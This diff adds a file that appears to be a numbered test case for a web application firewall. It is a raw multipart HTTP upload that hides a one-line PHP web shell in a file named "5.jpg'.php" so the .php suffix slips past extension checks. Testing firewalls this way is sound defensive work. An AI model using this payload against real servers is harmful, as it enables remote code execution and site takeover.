@@ -1,0 +1,20 @@
+# upload_bypass_畸形表单7
+# 使用“;”、“'”等方式截断后缀，从而造成了绕过
+POST /?bid=hd_tag_m8mv23td HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23td
+RM-PRO-Token: c6084eddc610bb731d10cd340d152fcc
+RM-PRO-Time: 1742808343404
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=aabbxxyy
+
+--aabbxxyy
+Content-Disposition: form-data; name="upload_file"; filename="5.jpg'.php"
+Content-Type: image/gif
+
+<?php $_GET[a]($_GET[b]);?>
+--aabbxxyy
+Content-Disposition: form-data; name="submit"
+
+上传
+--aabbxxyy--
